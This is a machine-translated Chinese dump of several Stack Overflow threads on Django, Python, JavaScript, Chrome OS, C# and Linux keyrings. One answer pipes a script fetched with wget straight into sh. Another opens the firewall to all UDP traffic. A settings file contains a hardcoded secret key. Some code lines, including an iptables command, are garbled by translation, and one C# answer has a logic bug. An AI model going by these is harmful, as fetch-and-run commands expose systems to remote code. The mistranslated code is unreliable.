    num_errors = get_validation_errors(s, app)
  文件“/Library/Python/2.7/site-packages/django/core/management/validation.py”，第 35 行，在 get_validation_errors
    get_app_errors().items() 中的 (app_name, error)：
  文件“/Library/Python/2.7/site-packages/django/db/models/loading.py”，第 166 行，在 get_app_errors
    self._populate()
  _populate 中的文件“/Library/Python/2.7/site-packages/django/db/models/loading.py”，第 72 行
    self.load_app(app_name, True)
  文件“/Library/Python/2.7/site-packages/django/db/models/loading.py”，第 96 行，在 load_app
    模型 = import_module('.models', app_name)
  文件“/Library/Python/2.7/site-packages/django/utils/importlib.py”，第 35 行，在 import_module
    __import__（名称）
  文件“/Library/Python/2.7/site-packages/django/contrib/auth/models.py”，第 370 行，在
    类 AbstractUser（AbstractBaseUser，PermissionsMixin）：
  __new__ 中的文件“/Library/Python/2.7/site-packages/django/db/models/base.py”，第 213 行
    new_class.add_to_class(field.name, copy.deepcopy(field))
  文件“/Library/Python/2.7/site-packages/django/db/models/base.py”，第 265 行，在 add_to_class
    value.contribute_to_class(cls, 名称)
  文件“/Library/Python/2.7/site-packages/django/db/models/fields/__init__.py”，第257行，在contribute_to_class
    cls._meta.add_field(self)
  文件“/Library/Python/2.7/site-packages/django/db/models/options.py”，第 179 行，在 add_field
    self.local_fields.insert（二分（self.local_fields，字段），字段）
  文件“/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/functools.py”，第 56 行，在
    '__lt__': [('__gt__', lambda self, other: other
    '__lt__': [('__gt__', lambda self, other: other
    '__lt__': [('__gt__', lambda self, other: other
    '__lt__': [('__gt__', lambda self, other: other .........................
RuntimeError：在 cmp 中超出最大递归深度

```

***设置.py***

```
DEBUG = True
TEMPLATE_DEBUG = DEBUG
ADMINS = (
    # ('Your Name', 'your_email@example.com'),
)

MANAGERS = ADMINS

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.', # Add 'postgresql_psycopg2', 'mysql', 'sqlite3' or 'oracle'.
        'NAME': '',                      # Or path to database file if using sqlite3.
        # The following settings are not used with sqlite3:
        'USER': '',
        'PASSWORD': '',
        'HOST': '',                      # Empty for localhost through domain sockets or '127.0.0.1' for localhost through TCP.
        'PORT': '',                      # Set to empty string for default.
    }
}

ALLOWED_HOSTS = []

TIME_ZONE = 'America/Chicago'

LANGUAGE_CODE = 'en-us'

SITE_ID = 1

USE_I18N = True

USE_L10N = True
USE_TZ = True
MEDIA_ROOT = ''
MEDIA_URL = ''
STATIC_ROOT = ''
STATIC_URL = '/static/'
STATICFILES_DIRS = (
    # Put strings here, like "/home/html/static" or "C:/www/django/static".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
)

STATICFILES_FINDERS = (
    'django.contrib.staticfiles.finders.FileSystemFinder',
    'django.contrib.staticfiles.finders.AppDirectoriesFinder',
#    'django.contrib.staticfiles.finders.DefaultStorageFinder',
)

SECRET_KEY = '+8nn@%#%d8r4##x*t==ja=kbm(514bng1m47yesv1wlsu#%)h4'

TEMPLATE_LOADERS = (
    'django.template.loaders.filesystem.Loader',
    'django.template.loaders.app_directories.Loader',
#     'django.template.loaders.eggs.Loader',
)

MIDDLEWARE_CLASSES = (
    'django.middleware.common.CommonMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    # Uncomment the next line for simple clickjacking protection:
    # 'django.middleware.clickjacking.XFrameOptionsMiddleware',
)

ROOT_URLCONF = 'mysite.urls'

WSGI_APPLICATION = 'mysite.wsgi.application'

TEMPLATE_DIRS = (
    # Put strings here, like "/home/html/django_templates" or "C:/www/django/templates".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
)

INSTALLED_APPS = (
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.sites',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    # Uncomment the next line to enable the admin:
    # 'django.contrib.admin',
    # Uncomment the next line to enable admin documentation:
    # 'django.contrib.admindocs',
)

LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'filters': {
        'require_debug_false': {
            '()': 'django.utils.log.RequireDebugFalse'
        }
    },
    'handlers': {
        'mail_admins': {
            'level': 'ERROR',
            'filters': ['require_debug_false'],
            'class': 'django.utils.log.AdminEmailHandler'
        }
    },
    'loggers': {
        'django.request': {
            'handlers': ['mail_admins'],
            'level': 'ERROR',
            'propagate': True,
        },
    }
} 
```

***网址.py***

```
from django.conf.urls import patterns, include, url
home', name='home'),
    # url(r'^mysite/', include('mysite.foo.urls')),
    enter code here
    # Uncomment the admin/doc line below to enable admin documentation:
    # url(r'^admin/doc/', include('django.contrib.admindocs.urls')),

    # Uncomment the next line to enable the admin:
    # url(r'^admin/', include(admin.site.urls)),
) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-10T02:37:32.197

我知道这是一个老问题，但我遇到了同样的错误。将 Python 更新到 v 2.7.5 对我有用。

当我切换帐户但尝试启动同一个 Django 项目时出现错误，并且我只在第一个帐户上更新了我的 Python 版本。

# python - 如何裁剪文本？

> ID：15555649
> 
> 赞同：0
> 
> 时间：2013-03-21T18:44:15.787
> 
> 标签：python, string, text

我有各种各样的文本，我想执行类似于裁剪图片的操作。

该文档的长度为几千字节，但格式为

“等等等等标题正文结束等等等等。”

我可以使用什么功能来做到这一点`crop(document,"title","end")`并让它返回`"title body end"`？

问题是替换文本的函数`string.replace()`总是用其他东西替换一些已知的文本。但我知道`title`在每个文档中，`end`和但内容`before`，之间和之后是未知或唯一的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:47:25.293

有很多方法，例如：

```
import re
doc = "blah blah title body end blah blah."
print re.search('title.+?end', doc).group(0) # title body end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:52:18.057

您可以使用该方法[`find`](http://docs.python.org/2/library/stdtypes.html#str.find)获取起始字符串[`rfind`](http://docs.python.org/2/library/stdtypes.html#str.rfind)第一次出现的索引，并获取结束字符串最后一次出现的索引。使用这些索引，您可以使用 Python 的切片返回文档的正确部分。

```
def crop(doc, start, end):
    return doc[doc.find(start):doc.rfind(end)+len(end)] 
```

# javascript - 等待来自对话框的用户反馈时出现流量控制问题

> ID：15555650
> 
> 赞同：0
> 
> 时间：2013-03-21T18:44:15.673
> 
> 标签：javascript, jquery

我正在使用 javascript 和 jquery 对话框来确认用户想要在 Web 客户端向服务器查询某些数据之前继续。

```
$("#get_stories").click(function(){
    if (userConfirms()){
      getStories()  //call routine to load and process stories
    } else {
      alert("Not getting any stories")
    };
    return false;
});

var userConfirms = function(){
  var $dialog = $("#dialogBox");
  $dialog.html("Are you sure?")
  $dialog.dialog("option", "buttons", 
    [
        {
            text: "Proceed",
            click: function(){
                $dialog.dialog("close");
                return true
            }
        },
        {
            text: "Cancel",
            click: function(){
                $dialog.dialog("close");
                return false
            }
        }
    ]
  );
  $dialog.dialog("open");
}; 
```

发生的事情是触发了 get_stories click 事件，正在调用 userConfirms() 以检查真/假，对话框打开以获取用户的反馈，但在用户单击“继续”或“取消”之前，控制流通过警报声明。怎样才能让原点击事件触发的函数等待用户反馈后再继续执行？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T21:00:31.067

userConfirms() 将始终返回`true`，解决方案是使用回调

```
var userConfirms = function(onSuccess, onCancel) { ..... 
```

然后点击功能（取消和成功）

```
click: function() { $.isFunction(onSuccess) && onSuccess() .... 
```

像这样打电话

```
userConfirms(callbackForSuccess, callbackForCancel) 
```

# javascript - 高效的 Javascript 数组查找

> ID：15555656
> 
> 赞同：5
> 
> 时间：2013-03-21T18:44:41.800
> 
> 标签：javascript, performance

如果我有一个字符串白名单，我想检查用户输入到我的 javascript 程序中的所有内容，那么最有效的方法是什么？我可以只拥有一个数组并循环遍历它，直到找到匹配项，但那是 O(N)。有没有更好的方法，并且不涉及任何类型的键值查找，只是检查该值是否存在？

编辑：我想我正在寻找的是相当于 C++ 中的一个集合，我可以在其中检查我给定的值是否已经存在于集合中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:47:50.840

对数组进行排序，使用二进制搜索进行查找。

或者

创建一个 key 为 item 的对象，并使用哈希查找 whitelist[value] != undefined

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:48:12.687

我想你会发现键值查找在性能上与某种没有值的集合实现几乎相同。（许多标准库实际上只是使用映射实现了一个集合）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-21T18:48:53.000

只需让它成为一个简单的 js 对象而不是数组。

```
var whitelist = {
  "string1":true,
  "string2":true
} 
```

然后你可以检查`if(whitelist[str])`它是否可用。

或使用`if(str in whitelist)`.

我希望第一个性能稍好一些（我还没有验证过），但第二个更易读并且目的更明确。因此，您选择哪个更合适。

# google-chrome-extension - Chrome 套接字 API 在 Chrome 操作系统上的行为不同（与 Ubuntu、Windows 相比）？

> ID：15555657
> 
> 赞同：3
> 
> 时间：2013-03-21T18:44:48.780
> 
> 标签：google-chrome-extension, google-chrome-os, mdns

我有一个示例 Chrome 打包应用程序，它使用 Chrome 套接字 API 来执行 DNS 服务发现。繁重的工作是从此处的示例中借用的：

[https://github.com/GoogleChrome/chrome-app-samples/tree/master/mdns-browser](https://github.com/GoogleChrome/chrome-app-samples/tree/master/mdns-browser)

我只是使用服务名称，例如`_pdl-datastream._tcp.local`（而不是默认的`_services._dns-sd._udp.local`）。

在我的 Ubuntu 和 Windows 设置（Chrome 25.0.1364.172）上，该应用程序可以成功找到我的网络打印机；我可以列出它的 IP 地址和服务实例名称。但是，它在我的三星 Chromebook (Chrome 25.0.1364.173) 上的 Chrome OS 中失败；什么也没找到。

知道问题可能是什么吗？这是一个已知的问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T19:00:29.263

您应该检查它是否是默认防火墙。默认情况下，在 Chromebook 上，我相信所有传入连接都被阻止。如果您在开发模式下运行，您可以执行以下操作以允许所有传入的 udp 流量测试这是否是问题：

1.  按 Ctrl+Alt+T 调出终端窗口并键入以下内容
2.  壳
3.  sudo iptables -I 输入 -p udp -j 接受

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T22:08:22.223

是的，Chromebook 默认使用限制性防火墙。但是，如果传入数据包与传出数据包匹配，则应允许传入数据包。这[是防火墙规则列表](http://git.chromium.org/gitweb/?p=chromiumos/platform/init.git;a=blob;f=iptables.conf;h=8325f81274e7672fabb762679850f2301a604144;hb=HEAD)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-19T15:14:51.007

根据 Haw-Bin 创建的[错误报告](https://code.google.com/p/chromium/issues/detail?id=223004)，这已被验证为自 2013 年底以来已修复。

# php - Symfony 不工作

> ID：15555665
> 
> 赞同：1
> 
> 时间：2013-03-21T18:45:21.120
> 
> 标签：php, symfony, while-loop

尝试使用此查询创建一个下拉列表并尝试返回一个数组，同时执行此操作，而 while 不起作用：s

```
static public function getConta() {
    $criteria = new Criteria();
    $criteria->addSelectColumn(MEMataPeer::CONTA);
    $criteria->addGroupByColumn(MEMataPeer::CONTA);
    $contas = array();
    $stmt = MEMatalPeer::doSelectStmt($criteria);        
    echo "##".$stmt->rowCount();
    while($res = $stmt->fetchColumn(0)) { // <- this while don't work don't    know why ?????
        $contas[$res] = $res;
        echo "<br/>[$res]";` 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T20:05:09.633

您的

```
$stmt->fetchColumn(0) 
```

有一个错误的评估（可能是一个空结果）。在这种情况下，没有什么可以结束的。

# python - python dict setdefault，困惑

> ID：15555673
> 
> 赞同：9
> 
> 时间：2013-03-21T18:45:44.943
> 
> 标签：python

我一直在寻找一种算法，但我无法弄清楚为什么 dict`d`中有值而`curr`没有。我认为 dict 似乎没有做任何事情`d`。

```
>>> def what(*words):
...     d = {}
...     print d
...     for word in words:
...     print 'word: ' + word
...         curr = d
...         for letter in word:
...             curr = curr.setdefault(letter, {})
...         curr = curr.setdefault('.', '.')
...     print d
...     print '?'
...     print curr
...     return 1
... 
>>> what('foo') 
{}
word: foo
{'f': {'o': {'o': {'.': '.'}}}}
?
.
1 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-21T18:49:08.203

阅读文档[`dict.setdefault`](http://docs.python.org/2/library/stdtypes.html#dict.setdefault)：就像`get`但如果密钥不存在，那么它也被设置：

```
>>> my_dict = {}
>>> my_dict.setdefault('some key', 'a value')
'a value'
>>> my_dict
{'some key': 'a value'}
>>> my_dict.get('some key2', 'a value2')
'a value2'
>>> my_dict
{'some key': 'a value'} 
```

稍微修改一下你的例子：

```
>>> def what(*words):
...     d = dict()
...     for word in words:
...             curr = d
...             for letter in word:
...                     curr = curr.setdefault(letter, {})
...             curr = curr.setdefault('.', '.')
...             print 'curr is now: %r while d is %r' % (curr, d)
... 
>>> what('foo')
curr is now: '.' while d is {'f': {'o': {'o': {'.': '.'}}}} 
```

正如您所看到`curr`的变化，因为`setdefault`有时（在您的示例中总是）调用它时会创建一个新的`dict`并将其设置为 的值`curr`，而`d`始终引用原始的`dict`。如您所见，它在循环**后被**修改，因为它的值`{'f': {'o': {'o': {'.': '.'}}}}`与`{}`.

可能您的困惑是由于`curr = curr.setdefault(letter, {})` **总是**创建一个**new**和**empty** `dict`，然后将其分配给`curr`（因此对于每个字母，您将嵌套级别添加到原始`dict`而不是覆盖值）。

看到这个：

```
>>> my_dict = {}
>>> curr = my_dict
>>> for letter in 'foo':
...     print 'my_dict is now %r. curr is now %r' % (my_dict, curr)
...     curr = curr.setdefault(letter, {})
... 
my_dict is now {}. curr is now {}
my_dict is now {'f': {}}. curr is now {}
my_dict is now {'f': {'o': {}}}. curr is now {}
>>> my_dict
{'f': {'o': {'o': {}}}} 
```

正如您所看到的，每个级别`my_dict`都有一个新的嵌套级别。

也许，但我只是猜测，你想获得类似的东西`'foo' -> {'f': {}, 'o': {}}`，在这种情况下你应该这样做：

```
>>> my_dict = {}
>>> for letter in 'foo':
...     my_dict.setdefault(letter, {})
... 
>>> my_dict
{'o': {}, 'f': {}} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-08-12T11:38:28.823

`d = dict()`--> 初始化一个空字典并将其绑定到名称`d`；所以你有一个`{}`由名称引用的字典对象 ( )`d`

**在外部 for 循环内部**
`curr = d`--> 将另一个名称绑定`curr`到同一个对象。因此，名称（`d`并`curr`引用同一个对象）

**在内部 for 循环内**
第一次迭代期间`letter = 'f'`

```
curr = curr.setdefault(letter, {}) 
```

上面的陈述中有两件事发生，

A) `curr.setdefault(letter, {})`--> 根据文档：

> “如果键在字典中，则返回其值。如果没有，则插入具有默认值的键并返回默认值。默认默认为无。”。

因为字母 'f' 不在初始字典对象中，它会将初始对象突变为`{'f':{}}`并返回 value `{}`，它不是初始字典对象，而是由于 setdefault 语句而创建的新对象。此时两者`curr`和都`d`引用了初始字典对象，该对象已突变为`{'f':{}}`.

B) 将名称重新分配`curr`给上述返回值。现在，名称`curr`和`d`指代不同的对象。`d`指的是 object `{'f':{}}`，while`curr`指的是一个空的字典对象，它实际上是 的值`d['f']`。这就是为什么嵌套发生在原始字典对象中的原因，因为我们通过循环。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-07-12T03:56:47.897

## `setdefault(key[, default)`

从[文档](https://docs.python.org/3/library/stdtypes.html#dict.setdefault)：

> 如果`key`在字典中，则返回其值。如果不是，则插入`key`值`default`并返回`default`。`default`默认为`None`.

**使用示例**

```
>>> d = {'a': 1, 'b': 2, 'c': 3}
>>> d.setdefault('a') # returns the corresponding value for key 'a'
1
>>> d.setdefault('a', 10) # returns the corresponding value for key 'a'
1
>>> d.setdefault('b') # returns the corresponding value for key 'b'
2
>>> d.setdefault('c', 100) # returns the corresponding value for key 'c'
3
>>> type(d.setdefault('z')) # because 'z' is not a key of d, None is returned which is the default value of default 
<class 'NoneType'>
>>> d.setdefault('z', 666) # returns 666 since key 'z' is not in d
666 
```

### 在您的代码中

我认为您很困惑，因为`curr = curr.setdefault(letter, {})`总是创建一个新的*空 dict*，然后将其分配给`curr`. 这意味着您不是覆盖值，而是为`words`.

我还认为您希望使用代码实现的目标是创建一个字典，其中每个元素都`words`作为键和`{}`值，因此您可以使用以下使用*dict-comprehension*的代码来实现它：

```
def what(*words):
    return {word: {} for word in set(words)} 
```

**注意：**我已经添加了解释，`setdefault`因为您的问题已经特别针对这种情况进行了查看，但我也想涵盖您的具体问题。

# linux - 如何在不先保存的情况下在终端上编写和运行 shell 程序

> ID：15555683
> 
> 赞同：3
> 
> 时间：2013-03-21T18:46:04.623
> 
> 标签：linux, bash, shell

我在 Linux 服务器上工作，我可以访问一个目录，但我不能向该目录写入任何内容。我可以从系统提示符运行命令。现在我必须在该目录中找到某些文件的特定字段的值并进行一些比较。我在测试服务器上有一个脚本可以做到这一点。但是我无法将我的脚本安装到服务器上，我问是否有任何我键入特定命令，然后我可以编写并运行一个 shell 程序而不保存程序？谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T18:52:06.207

如果你在另一台主机上有脚本，你可以这样运行它：

```
wget http://your.host.net/script -O- | sh -s 
```

如果主机无法通过 HTTP 访问，您可以使用任何其他您想要的协议。

您也可以直接在 shell 中编写脚本：

```
sh -s <<EOF
echo Hello
echo I am script
echo Nice to meet you
EOF 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:49:46.360

您可以使用 backtics 来执行另一个命令的结果。

```
`wget /path/to/your/script/stored/remotely -O-` 
```

（您可能会使用它`sftp`来获取脚本）

另一种选择是编写一个使用 tty 控制`ssh`会话的程序，然后脚本存储在 ssh 客户端上，但命令在服务器上运行。也许该`expect`工具会对此有所帮助。

# javascript - event.keyCode 在 Firefox 中不起作用

> ID：15555687
> 
> 赞同：7
> 
> 时间：2013-03-21T18:46:10.633
> 
> 标签：javascript, asp.net, events, login, keycode

我在 ASP.net C# 上开发的登录页面有问题。该表单适用于 IE，但不适用于 Firefox。这是我的示例：

```
<%@ Page Language="c#" Inherits="ClubCard.loginClubcard" CodeFile="loginClubcard.aspx.cs" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" > 
<html>
    <head>
        <title>
            Acceso Clubcard
        </title>

        <meta http-equiv="Page-Enter" content="blendTrans(Duration=0.25)" />
        <meta http-equiv="Page-Exit" content="blendTrans(Duration=0.25)" />
        <link rel="stylesheet" type="text/css" href="styles.css">

        <style>
            #centered
            {
                LEFT: 50%;
                MARGIN-LEFT: -235px;
                POSITION: absolute;
                TOP: 150px
            }

            .letras
            {
                FONT-SIZE: 10pt;
                COLOR: white;
                FONT-FAMILY: Arial
            }

            .cajas
            {
                FONT-SIZE: 10pt;
                FONT-FAMILY: Arial
            }

            .letrasGris A
            {
                FONT-SIZE: 12px;
                COLOR: #8f8f92;
                FONT-FAMILY: Arial;
                TEXT-DECORATION: none
            }

            .highlightit IMG
            {
                FILTER: progid:DXImageTransform.Microsoft.Alpha(opacity=100);
                -moz-opacity: 1
            }

            .highlightit:hover IMG
            {
                FILTER: progid:DXImageTransform.Microsoft.Alpha(opacity=50);
                -moz-opacity: 0.5
            }
        </style>

        <script language="javascript">            
            function actLogin()
            {
                __doPostBack('btnLogin', '');
            }

            function actFocus()
            {
                tbxPrincipal = document.getElementById("tbxUsername").focus();
            }

            function ValidarEnter(src)
            {
                if (event.keyCode == "13")
                {
                    actLogin();
                }
            }

            function AbrirLogin() 
            { 
                if (window.frameElement != null) 
                { 
                    window.parent.location.replace(window.location.href); 
                } 
            } 
        </script>

        <meta name="GENERATOR" content="Microsoft Visual Studio .NET 7.1">
        <meta name="CODE_LANGUAGE" content="C#">
        <meta name="vs_defaultClientScript" content="JavaScript">
        <meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
    </head>

    <body bgcolor="#ffffff" leftmargin="0" topmargin="0" onload="AbrirLogin();actFocus()">
        <form id="Form1" method="post" runat="server" target="_top">
            <table id="Table_01" width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
                <tr>
                    <td style="background: url(images/login/loginBg.gif) repeat-x">
                        &nbsp;
                    </td>
                </tr>
            </table>

            <div id="centered">
                <div style="left: 50%; margin-left: -100px; position: absolute">
                    <div>
                        <img src="images/login/logoClubCard.gif">
                    </div>
                </div>

                <div style="margin-left: 100px; width: 200px; position: absolute; top: 240px">
                    <table width="100%" cellpadding="0" cellspacing="2" border="0">
                        <tr>
                            <td align="right" class="letras">
                                USUARIO:
                            </td>

                            <td>
                                <asp:TextBox runat="server" CssClass="cajas" ID="tbxUsername">
                                </asp:TextBox>
                            </td>

                            <td rowspan="3">
                                &nbsp;&nbsp;
                                <a class="highlightit" href="javascript:actLogin()" tabindex="3">
                                    <img border="0" src="images/login/botonLogin.gif">
                                </a>
                            </td>
                        </tr>

                        <tr>
                            <td align="right" class="letras">
                                CLAVE:
                            </td>

                            <td>
                                <asp:TextBox runat="server" CssClass="cajas" ID="tbxPassword" TextMode="Password" OnKeyPress="ValidarEnter(this)" OnTextChanged="tbxPassword_TextChanged">
                                </asp:TextBox>
                            </td>
                        </tr>
                    </table>
                </div>

                <div style="margin-top: 54px">
                    <img src="images/login/cajaAzul.gif">
                </div>

                <div style="display: inline; float: left;width:50% " align="center">
                    <asp:RequiredFieldValidator ID="rfvUsername" runat="server" 
                        CssClass="tA" ErrorMessage="* Escriba su USUARIO"
                        ControlToValidate="tbxUsername">
                    </asp:RequiredFieldValidator>

                    <br>

                    <asp:RequiredFieldValidator ID="rfvPassword" runat="server" 
                        CssClass="tA" ErrorMessage="* Escriba su CLAVE"
                        ControlToValidate="tbxPassword">
                    </asp:RequiredFieldValidator>

                    <br>

                    <table >
                        <tr align="center">
                            <td>
                                <asp:Label runat="server" ID="lblError" Visible="False">
                                    <font color="red" class="tA">
                                        <b>
                                            El USUARIO y CLAVE no coincidieron, trate de nuevo
                                       </b>
                                    </font>
                                </asp:Label>
                            </td>
                        </tr>
                    </table>
                </div>
            </div>

            <div style="display: none">
                <input type="button" runat="server" id="btnLogin" value="login" onserverclick="btnLogin_ServerClick">
            </div>
        </form>
    </body>
</html> 
```

我注意到在这部分...

```
function ValidarEnter(src)
            {
                if (event.keyCode == "13")
                {
                    actLogin();
                }
            } 
```

当我在 Firefox 上调试它时，它只是跳过它。我已经尝试添加`window.event.keyCode`...并且仅用 13 切换“13”...我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-21T18:48:06.753

event.keycode was not supported by Firefox. Use event.which for firefox.

```
function checkKey(evt) {
  var keyID = (evt.charCode) ? evt.charCode : ((evt.which) ? evt.which : evt.keyCode);
  alert(keyID);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-04-18T11:18:36.760

当我遇到同样的问题时，我正在做一个项目。我做了一些`RND`并找出了这两件事；

> 1.  `e.keyCode``onkeydown()`无论浏览器是**Chrome**还是**Firefox**，功能都可以正常工作。

这是Chrome**和**Firefox**的****良好做法**。

 ****```
// HTML (Note onkeydown() function here)
<input id="anyId" onkeydown="return myFunction(event)" type="text" />

// JavaScript for it
function myFunction(e) {
    var asciiValue = e.keyCode ;
    alert ("ASCII Value: " + asciiValue );   // ASCII of pressed key
    if(asciiValue >0){
       return true;
    }
    else{
       return false;
    }
} 
```

> 2.  但是如果我们在**Firefox**`onkeypress()`中使用函数，那么将不起作用。为此，采用.**`e.keyCode``var asciiValue= e.keyCode || e.charCode`**

 **```
// HTML (Note onkeypress() function here)
<input id="anyId" onkeypress="return myFunction(event)" type="text" />

// JavaScript for it
function myFunction(e) {
    var asciiValue = e.keyCode || e.charCode ;   // It'll handle both Chrome & Firefox
    alert ("Ascii Value: " + asciiValue);    // ASCII of pressed key
    if(asciiValue>0){
       return true;
    }
    else{
       return false;
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-03-31T08:16:25.407

```
<input type="text" onkeypress="return key_fir(event);" name="name" id="login_email"> 
```

...

```
function key_fir(e)
    {
        e = e || window.event || {};
          var charCode = e.charCode || e.keyCode || e.which;
              if (charCode == 13) {                

                   //write your code here Like  $("#log_sub").click();
              }
    } 
```******

# c# - C#使用过滤器删除文件夹中的文件

> ID：15555689
> 
> 赞同：2
> 
> 时间：2013-03-21T18:46:19.870
> 
> 标签：c#, filter, delete-file

我正在使用 SharpDevelop 编写 C# 程序（不是控制台）。我想删除指定目录中的文件，但能够排除开头、结尾或包含某些单词的文件。

要完全删除我正在使用的文件夹中的所有文件：

```
private void clearFolder(string FolderName)
{
    DirectoryInfo dir = new DirectoryInfo(FolderName);

    foreach(FileInfo fi in dir.GetFiles())
    {
        fi.Delete();
    }

    foreach (DirectoryInfo di in dir.GetDirectories())
    {
        clearFolder(di.FullName);
        di.Delete();
    }
} 
```

我像这样使用它

```
ClearFolder("NameOfFolderIWantToEmpty"); 
```

有没有办法修改它，以便我可以删除所有文件和目录，除了那些包含特定单词的文件和目录？

就像是 ：

```
CleanFolder(FolderToEmpty,ExcludeAllFileAndDirectoriesContaingThisPhrase); 
```

所以如果我这样做了

```
CleanFolder("MyTestFolder","_blink"); 
```

它不会删除名称如下的文件和目录

```
_blinkOne (file)

Test_blineGreen (file)

Test_blink5 (directory)

_blinkTwo (file within the Text_blink5 directory)

Folder_blink (empty directory) 
```

但会删除文件和目录，如

```
test (file)

test2 (directory)

test3_file (file within test2 directory)

test4 (empty directory) 
```

我怀疑我可能必须遍历每个文件和目录，一次检查一个以查找匹配的过滤器，如果不匹配则将其删除，但我不知道该怎么做。

有什么`FileInfo()`，`DirectoryInfo()`也许？

有人可以通过提供一个工作示例来提供帮助吗？（最好是上面的修改版本，但是如果需要新的方法，只要不需要外部dll就可以了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:51:47.667

只是测试看看是`FileInfo.Name`属性（字符串）`StartsWith`还是`EndsWith`指定的字符串。

```
 foreach (FileInfo fInfo in di.GetFiles())
    {
        if (!fInfo.Name.StartsWith("AAA") || 
            !fInfo.Name.EndsWith("BBB"))
        {
            fInfo.Delete();
        }
    } 
```

或者，如果您正在文件名中的任何位置查找单词，请使用以下`Contains`方法：

```
 foreach (FileInfo fInfo in di.GetFiles())
    {
        if (!fInfo.Name.Contains("CCC")) 
        {
            fInfo.Delete();
        }
    } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-21T18:54:09.747

使用[`Directory.GetFiles(string, string)`](http://msdn.microsoft.com/en-us/library/wz42302f.aspx)方法获取与您的模式*匹配*`Enumerable.Except(IEnumerable<T>)`的文件列表，并使用获取您实际要删除的文件。

```
string pattern = "*.*";
var matches = Directory.GetFiles(folderName, pattern);
foreach(string file in Directory.GetFiles(folderName).Except(matches))
    File.Delete(file); 
```

此处无需使用 DirectoryInfo，因为您似乎只关心操作目录中的文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:55:12.350

```
if(!fi.Name.Contains("_blink"))
      fi.Delete(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-23T01:26:17.410

我想我有一个适合我的解决方案。在此处发布完整代码，以便其他人可以使用、调整和/或检查可能存在的缺陷。这是我第一次使用 StackOverFlow，并且知道我有这个资源可供搜索并且能够提出问题并且人们实际上可以提供帮助，这对我作为一个对所有这些东西不熟悉的人来说是一种极大的安慰。

非常感谢大家！

// 递归搜索目录并删除所有子目录和文件

// 名称不包含给定的搜索模式

```
private void clearFolderWithFilter(string folderName, string filesToExclude)
{
    DirectoryInfo dir = new DirectoryInfo(folderName);

    foreach(FileInfo fi in dir.GetFiles())
    {
        if(!fi.Name.Contains(filesToExclude))
        {
            // System.Diagnostics.Debug.WriteLine("DELETING file " + fi + " because it does NOT contain '" + filesToExclude + "' ");
            fi.Delete();
        } else {
            // System.Diagnostics.Debug.WriteLine("SAVING file " + fi + " because it contains '" + filesToExclude + "' ");
        }
    }

    foreach (DirectoryInfo di in dir.GetDirectories())
    {
        if(!di.Name.Contains(filesToExclude))
        {
            // System.Diagnostics.Debug.WriteLine("DELETING directory " + di + " because it does NOT contain '" + filesToExclude + "' ");
            clearFolderWithFilter(di.FullName, filesToExclude);
            di.Delete();
        } else {
            // System.Diagnostics.Debug.WriteLine("SAVING directory " + di + " because it contains '" + filesToExclude + "' ");
        }
    }
} 
```

用法 ：

```
clearFolderWithFilter(@"C:\Path\MyFolder","DoNotDelete_"); 
```

# c - 关于 add_key（Linux 密钥管理）接口使用的困惑

> ID：15555691
> 
> 赞同：2
> 
> 时间：2013-03-21T18:46:27.230
> 
> 标签：c, linux, linux-kernel, key-management

我需要在内核中存储一些加密密钥，其中每个密钥都与磁盘上的路径相关。一组受限制的用户可以在这样的路径上创建文件，但加密密钥由所有此类用户共享。我正在考虑为我的项目使用 linux 内核密钥管理工具。我有一个管理密钥和内核模块的用户模式应用程序。但是我不清楚 add_key 接口。如何创建所有人都可以访问的全局密钥环？add_key 的手册页对 add_key 有这样的说法

> key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t keyring);
> 
> **描述**
> 
> add_key() 要求内核创建或更新给定类型和描述的密钥，使用长度为 plen 的有效负载对其进行实例化，并将其附加到指定的密钥环并返回其序列号。
> 
> 目标密钥环序列号可能是调用者具有写入权限的有效密钥环序列号，也可能是特殊密钥环 ID：
> 
> KEY_SPEC_THREAD_KEYRING 这指定调用者的线程特定密钥环。
> 
> KEY_SPEC_PROCESS_KEYRING 这指定调用者的进程特定的密钥环。
> 
